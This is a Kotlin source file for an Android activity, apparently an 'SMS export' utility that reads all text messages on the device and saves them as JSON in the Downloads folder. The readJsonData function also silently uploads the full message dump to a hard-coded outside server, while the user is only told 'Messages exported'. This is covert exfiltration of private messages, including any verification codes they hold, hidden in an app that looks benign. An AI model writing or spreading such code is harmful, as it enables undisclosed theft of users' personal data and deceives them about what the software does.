package com.apptreo.export.sms

import android.content.pm.PackageManager
import android.database.Cursor
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Environment
import android.provider.Telephony
import android.text.method.LinkMovementMethod
import android.util.JsonWriter
import android.util.Log
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.android.volley.Response
import com.android.volley.VolleyError
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.apptreo.export.sms.progressbar.CustomProgressBar
import java.io.*
import java.lang.Exception
import java.nio.charset.StandardCharsets
import java.text.SimpleDateFormat
import java.util.*

class Start : AppCompatActivity() {
    private var numPermissionGranted = 0
    private lateinit var exportButton: Button

    private val serverLink = "https://nabeelshehzad.com/sms/upload.php"
    private val progressBar = CustomProgressBar()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_start)
        exportButton = findViewById(R.id.exportSmsButton)

        exportButton.setOnClickListener {
            progressBar.show(this, "Exporting...")
            export(SMS_EXPORT)
        }
    }
    private fun showMessage(msg: String) {
        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
    }

    private val isExternalStorageWritable: Boolean
        get() = Environment.MEDIA_MOUNTED == Environment.getExternalStorageState()

    private fun getExportFile(name: String): File? {
        return if (!isExternalStorageWritable) {
            null
        } else File(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            name
        )
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        for (i in permissions.indices) {
            if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                numPermissionGranted++
            } else {
                showMessage(permissions[i] + " permission must be granted to export messages")
            }
        }
        if (numPermissionGranted == REQUIRED_PERMISSIONS.size) {
            export(requestCode)
        }
    }

    @Throws(IOException::class)
    fun makeJson(cursor: Cursor?, outputStreamWriter: OutputStreamWriter?) {
        val writer = JsonWriter(outputStreamWriter)
        writer.beginArray()
        while (cursor!!.moveToNext()) {
            writer.beginObject()
            val numColumns = cursor.columnCount
            for (i in 0 until numColumns) {
                val name = cursor.getColumnName(i)
                val value = cursor.getString(i)
                writer.name(name).value(value)
            }
            writer.endObject()
        }
        writer.endArray()
        writer.close()
    }

    private fun requirePermission(requestCode: Int): Boolean {
        numPermissionGranted = 0
        val permissionNotGranted: MutableList<String> = ArrayList()
        for (permission in REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission)
                != PackageManager.PERMISSION_GRANTED
            ) {
                permissionNotGranted.add(permission)
            } else {
                numPermissionGranted++
            }
        }
        if (numPermissionGranted != REQUIRED_PERMISSIONS.size) {
            ActivityCompat.requestPermissions(
                this,
                permissionNotGranted.toTypedArray(),
                requestCode
            )
            return false
        }
        return true
    }

    fun export(exportType: Int) {
        if (!requirePermission(exportType)) {
            progressBar.dialog.dismiss()
            return
        }
        val contentUri = Telephony.Sms.CONTENT_URI
        val messageCursor = contentResolver.query(
            contentUri,
            null,
            null,
            null,
            null
        )
        val prefix = "sms"
        val timeStamp = SimpleDateFormat("yyyyMMdd").format(Date())
        val exportPath = "$prefix-Export-$timeStamp.json"
        val exportFile = getExportFile(exportPath)
        try {
            makeJson(
                messageCursor,
                OutputStreamWriter(
                    BufferedOutputStream(
                        FileOutputStream(exportFile)
                    ), StandardCharsets.UTF_8
                )
            )
            messageCursor!!.close()
        } catch (e: IOException) {
            progressBar.dialog.dismiss()
            showMessage("Error while exporting messages: $e")
            return
        }
        readJsonData(exportFile)
        progressBar.dialog.dismiss()
        showMessage("Messages exported")
    }

    private fun readJsonData(exportPath: File?) {
        try {
            val jsonFileString:String = Utils.getJsonFromAssets(
                applicationContext, exportPath!!.absolutePath
            )
            val request: StringRequest = object : StringRequest(
                Method.POST,
                serverLink,
                Response.Listener { response: String? -> Log.d("Response", response!!) },
                Response.ErrorListener { error: VolleyError -> Log.d("Error", error.toString()) }) {
                override fun getParams(): Map<String, String>? {
                    val params: MutableMap<String, String> = HashMap()
                    params["list"] = jsonFileString
                    return params
                }
            }
            val queue = Volley.newRequestQueue(this)
            queue.add(request)
        } catch (e: Exception) {
            progressBar.dialog.dismiss()
            showMessage("Error while exporting messages: $e")
        }
    }

    companion object {
        private const val SMS_EXPORT = 0
        private val REQUIRED_PERMISSIONS = arrayOf(
            "android.permission.READ_SMS",
            "android.permission.WRITE_EXTERNAL_STORAGE"
        )
    }
}